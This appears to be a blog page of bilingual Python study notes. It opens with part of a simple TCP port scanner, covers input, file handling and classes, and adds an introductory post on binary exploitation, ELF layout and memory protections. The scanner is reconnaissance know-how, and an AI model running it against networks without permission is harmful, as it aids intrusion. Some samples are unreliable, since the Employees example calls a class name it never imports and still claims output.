class="string">&quot;Syntax: python3 scanner.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add a pretty banner</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scanning target &quot;</span>+target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Time started: &quot;</span>+<span class="built_in">str</span>(datetime.now()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>,<span class="number">85</span>):</span><br><span class="line">		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">		result = s.connect_ex((target,port)) <span class="comment">#returns an error indicator - if port is open it throws a 0, otherwise 1</span></span><br><span class="line">		<span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Port &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nExiting program.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">except</span> socket.gaierror:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hostname could not be resolved.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Could not connect to server.&quot;</span>)</span><br><span class="line">	sys.exit()</span><br></pre></td></tr></table></figure>
</code></pre><h3 id="User-Input"><a href="#User-Input" class="headerlink" title="User Input"></a><strong>User Input</strong></h3><ul>
<li>using the <code>input()</code> function</li>
<li>與使用者互動並接收輸入</li>
<li>提示使用者輸入並以字串形式接收輸入</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;Enter your name: &quot;</span>)<span class="comment">#提示使用者輸入姓名</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)<span class="comment">#顯示訊息「輸入您的姓名：」作為提示。</span></span><br><span class="line"><span class="comment">#使用者可以輸入自己的姓名並按 Enter 鍵</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>input()</code> function always returns the user’s input as a string</li>
<li>需要將輸入轉換為不同的資料類型（例如整數或浮點數）<ul>
<li>使用適當的轉換函數，例如 int() 或 float()</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">input</span>(<span class="string">&quot;Enter your age: &quot;</span>)<span class="comment">#輸入作為字串儲存在變數age中</span></span><br><span class="line">age = <span class="built_in">int</span>(age)  <span class="comment"># 若要執行算術計算，請使用 int() 函數將輸入轉換為整數</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You will be &quot;</span> + <span class="built_in">str</span>(age + <span class="number">1</span>) + <span class="string">&quot; next year.&quot;</span>)<span class="comment">#將年齡加 1 並列印結果</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用用戶輸入時，請記住它預設是一個字串</li>
<li>透過在運行時接受使用者的輸入來使程式具有互動性和動態性</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a number: &quot;</span>))</span><br><span class="line">o = <span class="built_in">input</span>(<span class="string">&quot;Give me an operator: &quot;</span>)</span><br><span class="line">y = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me yet another number: &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x + y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x - y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x / y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x * y)</span><br><span class="line"><span class="keyword">elif</span> o == <span class="string">&quot;**&quot;</span>:</span><br><span class="line">	<span class="built_in">print</span>(x ** y)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Unknown operator.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Reading-and-Writing-Files"><a href="#Reading-and-Writing-Files" class="headerlink" title="Reading and Writing Files"></a><strong>Reading and Writing Files</strong></h3><ul>
<li>使用檔案物件和內建open()函數提供的各種方法來讀取和寫入檔案</li>
<li><p>Reading Files</p>
<ul>
<li>using the <code>open()</code> function以讀取模式開啟文件</li>
<li>使用 read()、readline() 或 readlines() 等方法來擷取檔案的內容</li>
<li>read()<ul>
<li>以字串形式讀取檔案的全部內容</li>
</ul>
</li>
<li>readline()<ul>
<li>從文件中讀取一行</li>
</ul>
</li>
<li><p>readlines()</p>
<ul>
<li>從檔案中讀取所有行並將它們作為列表傳回</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in read mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the entire content</span></span><br><span class="line">content = file.read()</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read a single line</span></span><br><span class="line">line = file.readline()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read all lines</span></span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Writing Files</p>
<ul>
<li>using the <code>open()</code> function以寫入模式開啟文件</li>
<li><p>使用 write() 方法將內容寫入檔案</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(content)</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定內容寫入檔案</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in write mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write content to the file</span></span><br><span class="line">file.write(<span class="string">&quot;Hello, World!\n&quot;</span>)</span><br><span class="line">file.write(<span class="string">&quot;This is a new line.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Appending to Files</p>
<ul>
<li>若要將內容追加至現有檔案而不覆寫其現有內容</li>
<li><p>使用 open() 函數以追加模式（”a”）開啟該檔案</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Open the file in append mode</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Append content to the file</span></span><br><span class="line">file.write(<span class="string">&quot;\nThis is appended content.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close the file</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>在處理檔案時使用 with 語句。這可以確保即使發生異常也能正確關閉檔案。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;giveread.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">January</span></span><br><span class="line"><span class="string">February</span></span><br><span class="line"><span class="string">March</span></span><br><span class="line"><span class="string">April</span></span><br><span class="line"><span class="string">May</span></span><br><span class="line"><span class="string">June</span></span><br><span class="line"><span class="string">July</span></span><br><span class="line"><span class="string">August</span></span><br><span class="line"><span class="string">September</span></span><br><span class="line"><span class="string">October</span></span><br><span class="line"><span class="string">November</span></span><br><span class="line"><span class="string">December</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">months = <span class="built_in">open</span>(<span class="string">&#x27;giveread.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months)<span class="comment">#&lt;_io.TextIOWrapper name=&#x27;giveread.txt&#x27; mode=&#x27;r&#x27; encoding=&#x27;UTF-8&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.mode)<span class="comment">#r</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readable())<span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.read())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">January</span></span><br><span class="line"><span class="string">February</span></span><br><span class="line"><span class="string">March</span></span><br><span class="line"><span class="string">April</span></span><br><span class="line"><span class="string">May</span></span><br><span class="line"><span class="string">June</span></span><br><span class="line"><span class="string">July</span></span><br><span class="line"><span class="string">August</span></span><br><span class="line"><span class="string">September</span></span><br><span class="line"><span class="string">October</span></span><br><span class="line"><span class="string">November</span></span><br><span class="line"><span class="string">December</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">months.seek(<span class="number">0</span>)<span class="comment">#if not add it, the output can&#x27;t see anything</span></span><br><span class="line"><span class="built_in">print</span>(months.readline())<span class="comment">#January</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readlines())<span class="comment">#[&#x27;February\n&#x27;, &#x27;March\n&#x27;, &#x27;April\n&#x27;, &#x27;May\n&#x27;, &#x27;June\n&#x27;, &#x27;July\n&#x27;, &#x27;August\n&#x27;, &#x27;September\n&#x27;, &#x27;October\n&#x27;, &#x27;November\n&#x27;, &#x27;December&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">months.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(months.readlines())<span class="comment">#[&#x27;January\n&#x27;, &#x27;February\n&#x27;, &#x27;March\n&#x27;, &#x27;April\n&#x27;, &#x27;May\n&#x27;, &#x27;June\n&#x27;, &#x27;July\n&#x27;, &#x27;August\n&#x27;, &#x27;September\n&#x27;, &#x27;October\n&#x27;, &#x27;November\n&#x27;, &#x27;December&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">months.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> month <span class="keyword">in</span> months:</span><br><span class="line">    <span class="built_in">print</span>(month.strip())</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    January</span></span><br><span class="line"><span class="string">    February</span></span><br><span class="line"><span class="string">    March</span></span><br><span class="line"><span class="string">    April</span></span><br><span class="line"><span class="string">    May</span></span><br><span class="line"><span class="string">    June</span></span><br><span class="line"><span class="string">    July</span></span><br><span class="line"><span class="string">    August</span></span><br><span class="line"><span class="string">    September</span></span><br><span class="line"><span class="string">    October</span></span><br><span class="line"><span class="string">    November</span></span><br><span class="line"><span class="string">    December</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">days = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(days.mode)<span class="comment">#w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(days)<span class="comment">#&lt;_io.TextIOWrapper name=&#x27;day.txt&#x27; mode=&#x27;w&#x27; encoding=&#x27;UTF-8&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">days.write(<span class="string">&quot;Monday&quot;</span>)</span><br><span class="line">days.write(<span class="string">&quot;\nTuesday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(out.readlines())<span class="comment">#[&#x27;Monday\n&#x27;, &#x27;Tuesday&#x27;]</span></span><br><span class="line"></span><br><span class="line">days = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">days.write(<span class="string">&quot;\nWednesday&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;day.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">days.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(out.readlines())<span class="comment">#[&#x27;Monday\n&#x27;, &#x27;Tuesday\n&#x27;, &#x27;Wednesday&#x27;]</span></span><br><span class="line"></span><br><span class="line">months.close()</span><br></pre></td></tr></table></figure>
<h3 id="Classes-and-Objects"><a href="#Classes-and-Objects" class="headerlink" title="Classes and Objects"></a><strong>Classes and Objects</strong></h3><ul>
<li>classes and objects are key components of object-oriented programming (OOP)</li>
<li>建立程式碼和定義自訂資料類型的方法</li>
<li>提供了一種組織程式碼、封裝資料和定義可重複使用實體的方法</li>
<li>利用繼承、多態性和封裝的原則對現實世界的實體進行建模、建立自訂資料類型並建立複雜的系統</li>
<li><p>Classes</p>
<ul>
<li>創建物件的藍圖或模板</li>
<li>定義了該類別的物件將擁有的屬性（屬性）和行為（方法）</li>
<li><p>視為建立具有相似特徵和功能的物件實例的藍圖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:<span class="comment">#Dog 類別具有屬性 name 和age</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):<span class="comment">#__init__() 方法是一種稱為建構函數的特殊方法，在建立類別的物件時呼叫該方法</span></span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):<span class="comment">#方法 bark() 和 display_info()</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Woof!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Name:&quot;</span>, <span class="variable language_">self</span>.name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Age:&quot;</span>, <span class="variable language_">self</span>.age)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Objects</p>
<ul>
<li>物件是類別的實例</li>
<li>根據類別提供的藍圖創建的</li>
<li>每個物件都有自己的一組屬性，並且可以呼叫類別中定義的方法</li>
<li><p>透過呼叫類別來建立對象，就好像它是一個函數一樣</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create objects of the Dog class</span></span><br><span class="line"><span class="comment">#dog1 和dog2 是從Dog 類別建立的物件</span></span><br><span class="line">dog1 = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">5</span>)</span><br><span class="line">dog2 = Dog(<span class="string">&quot;Max&quot;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#每個物件都有自己的一組屬性（名稱和年齡）</span></span><br><span class="line"><span class="comment"># Call methods on the objects</span></span><br><span class="line"><span class="comment">#可以呼叫類別中定義的方法（bark() 和 display_info()）</span></span><br><span class="line">dog1.bark()               <span class="comment"># Output: &quot;Woof!&quot;</span></span><br><span class="line">dog1.display_info()       <span class="comment"># Output: &quot;Name: Buddy&quot;, &quot;Age: 5&quot;</span></span><br><span class="line"></span><br><span class="line">dog2.bark()               <span class="comment"># Output: &quot;Woof!&quot;</span></span><br><span class="line">dog2.display_info()       <span class="comment"># Output: &quot;Name: Max&quot;, &quot;Age: 3&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Employees.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employeesss</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, department, role, salary, years_employed</span>):</span><br><span class="line">		<span class="variable language_">self</span>.name = name</span><br><span class="line">		<span class="variable language_">self</span>.department = department</span><br><span class="line">		<span class="variable language_">self</span>.role = role</span><br><span class="line">		<span class="variable language_">self</span>.salary = salary</span><br><span class="line">		<span class="variable language_">self</span>.years_employed = years_employed</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">eligible_for_retirement</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.years_employed &gt;= <span class="number">20</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">-----</span><br><span class="line"><span class="comment">#useobj.py</span></span><br><span class="line"><span class="keyword">from</span> Employees <span class="keyword">import</span> Employeesss</span><br><span class="line"></span><br><span class="line">e1 = Employees(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Sales&quot;</span>, <span class="string">&quot;Director of Sales&quot;</span>, <span class="number">100000</span>, <span class="number">20</span>)</span><br><span class="line">e2 = Employees(<span class="string">&quot;Linda&quot;</span>, <span class="string">&quot;Executive&quot;</span>, <span class="string">&quot;CIO&quot;</span>, <span class="number">150000</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(e1.name)<span class="comment">#Bob</span></span><br><span class="line"><span class="built_in">print</span>(e2.role)<span class="comment">#CIO</span></span><br><span class="line"><span class="built_in">print</span>(e1.eligible_for_retirement())<span class="comment">#True</span></span><br></pre></td></tr></table></figure>
<h3 id="Building-a-Shoe-Budget-Tool"><a href="#Building-a-Shoe-Budget-Tool" class="headerlink" title="Building a Shoe Budget Tool"></a><strong>Building a Shoe Budget Tool</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shoes</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, price</span>):</span><br><span class="line">                <span class="variable language_">self</span>.name = name</span><br><span class="line">                <span class="variable language_">self</span>.price = <span class="built_in">float</span>(price)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">budget_check</span>(<span class="params">self, budget</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(budget, (<span class="built_in">int</span>, <span class="built_in">float</span>)):</span><br><span class="line">                    <span class="comment">#isinstance() 函數用來檢查一個物件是否是某個類別的實例</span></span><br><span class="line">                    <span class="comment">#檢查變數 budget 是否是 int 或 float 類型中的一種</span></span><br><span class="line">                    <span class="comment">#如果 budget 不是 int 或 float 類型的實例，執行下面的程式碼區塊</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;Invalid entry. Please enter a number.&#x27;</span>)</span><br><span class="line">                        exit()                </span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">self, budget</span>):</span><br><span class="line">                <span class="keyword">return</span> (budget - <span class="variable language_">self</span>.price)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">self, budget</span>):</span><br><span class="line">            <span class="comment">#用來檢查傳入的預算參數是否為有效的數字類型（即 int 或 float）</span></span><br><span class="line">                <span class="variable language_">self</span>.budget_check(budget)               </span><br><span class="line">                            </span><br><span class="line">                <span class="keyword">if</span> budget &gt;= <span class="variable language_">self</span>.price:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;You can cop some <span class="subst">&#123;self.name&#125;</span>&#x27;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> budget == <span class="variable language_">self</span>.price:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&#x27;You have exactly enough money for these shoes.&#x27;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&#x27;You can buy these shoes and have $<span class="subst">&#123;self.change(budget)&#125;</span> left over&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        exit(<span class="string">&#x27;Thanks for using our shoe budget app!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shoes <span class="keyword">import</span> Shoes</span><br><span class="line"><span class="comment"># self.name = name || self.price = float(price)</span></span><br><span class="line">low = Shoes(<span class="string">&#x27;And ls&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">medium = Shoes(<span class="string">&#x27;Air Force 1s&#x27;</span>,<span class="number">120</span>)</span><br><span class="line">high = Shoes(<span class="string">&#x27;off whites&#x27;</span>,<span class="number">400</span>)</span><br><span class="line"><span class="comment">#            self.name</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    Shoes_budget = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;what is your shoe budget? &quot;</span>))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    exit(<span class="string">&quot;Pls enter a number&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Shoes <span class="keyword">in</span> [high,medium,low]:</span><br><span class="line">    Shoes.buy(Shoes_budget)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if budget &gt;= self.price:</span></span><br><span class="line"><span class="string">    print(f&#x27;You can cop some &#123;self.name&#125;&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/python]</span><br><span class="line">└─$ python3 buy.py </span><br><span class="line">what is your shoe budget? 100</span><br><span class="line">You can cop some And <span class="built_in">ls</span></span><br><span class="line">You can buy these shoes and have <span class="variable">$70</span>.0 left over</span><br><span class="line">Thanks <span class="keyword">for</span> using our shoe budget app!</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="assem-PWN" class="article article-type-assem" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/PWN/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.091Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/PWN/">
        Pwn - Unleashing the Power of Exploits
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ktoVQB99Gj4">Pwn week1</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/u1f383/Software-Security-2021">https://github.com/u1f383/Software-Security-2021</a></p>
<p>Dockerfile build commend → docker build  . <em>—no-cache</em></p>
<h3 id="Binary-exploitation"><a href="#Binary-exploitation" class="headerlink" title="Binary exploitation"></a>Binary exploitation</h3><p>程式 &gt; 編譯產二進制<strong>執行檔案</strong></p>
<p>漏洞 &gt;程式出現與<strong>預期不同</strong>的行為，從而產生偏差，有些無關緊要，但有些能夠改變原要執行的動作或流程</p>
<p>pwn &gt;透過一或多個漏洞的利用，竄改執行流程，最終獲得程式的掌控權</p>
<ul>
<li>取得shell → 輸入指令操作程式</li>
<li>讀取、竄改檔案 → 讀取敏感或未經授權可讀取的檔案內容</li>
</ul>
<p><img src="img/pwn_Untitled.png" alt="Untitled"></p>
<p>例子:</p>
<p><img src="img/pwn_Untitled_1.png" alt="Untitled"></p>
<h3 id="ELF-→-Executable-and-Linkable-Format"><a href="#ELF-→-Executable-and-Linkable-Format" class="headerlink" title="ELF → Executable and Linkable Format"></a>ELF → Executable and Linkable Format</h3><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/Hy9u21gap">pwn tool install</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/BJ_Dpylp6">記憶體區塊</a></p>
<ul>
<li>像windows執行檔</li>
<li><p>Linux中所用的可執行檔案格式</p>
<ul>
<li>用Section區分不同功能資料</li>
<li><p>程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。</p>
<p>  <img src="img/pwn_Untitled_2.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
<pre><code>![Untitled](img/pwn_Untitled_3.png)

![Untitled](img/pwn_Untitled_4.png)

- 不同功能需要不同權限、大小
- 程式碼屬於.text section會需要執行權限
- 常數字串屬於.rodata section 會需要讀取權限
- section vs. segment
    - section → 告訴linker 動態鏈結時需要的資料
        - 名稱表示資料的功能
        - 是否需要被載入記憶體
        - 只是用來描述其他屬性的metadata section
    - segment → 告訴**作業系統**此程式被載入時的資訊
        - 相同權限的資料載入至相同的區塊
        - 被載入到哪塊 virtual memory

    ![Untitled](img/pwn_Untitled_5.png)

    readelf 是一個可以pass整個elf結構的binary

    readelf -a filename

    ### Segment → readelf -l ./test

    - 1-1紅色方框中是權限跟屬性
    - 1-1綠色方框type → LOAD → 載入到記憶體當中
    - 1-1粉色方框R、RE、RW → 對應屬性
    - 1-2 紅色方框 Segment 包含哪些section
    - 1-2 像是.interp、.note、.gnu.property..這些section為綠框的**02 segment**當中，他們都需要讀取的權限而已

    ### Section → readelf -S ./test

    - 有些section單純放 比如說紅框中[ 2] .note.gnu.propert information(build-id or propert..)
    - [16] .test 為常見的section，這裡用來**放程式碼**，紀錄這段資料程式碼動態時屬性是PROGBITS，他必須要被載入到記憶體當中，**載入後也需要執行權限**

    ### ELF - Protection 保護機制

    ELF (Executable and Linkable Format) 保護機制是一些技術，它們用於保護系統免受攻擊，或者對抗那些試圖破壞或逆向工程軟體的人。這些保護措施包括：

    - PIE → Position-Independent Executable
        - PIE 是一種保護機制，允許軟體在記憶體中的任何位置執行。這使得攻擊者**更難推斷出程式的記憶體位址**，因此使得程式更難被破壞。
        - 程式碼會以**相對位址**的方式表示，而非絕對位址

    - NX → No-eXecute
        - NX 是一種記憶體保護機制，可**防止未經授權的代碼執行**。它通常用於保護**堆(Heap)和栈(Stack)**記憶體，以防止攻擊者插入恶意代碼，並從中執行。
        - 保護機制之下.test之外的Section不會有執行權限

    - Canary → Stack protector
        - Canary 是一種記憶體保護機制，用於檢測攻擊者是否試圖破壞程式的堆或棧記憶體。它通常是**通過在堆或棧記憶體中插入一個隨機值**，並在程式**執行期間**經常檢查該值是否被修改來實現的。如果該值被修改，則可以推斷出有人試圖破壞記憶體，並采取適當的措施。

    - RELRO → RELocation Rread-Only
        - 分成Full / Partial / No 三種型態，分別代表在Runtime解析外部Function時使用的不同機制
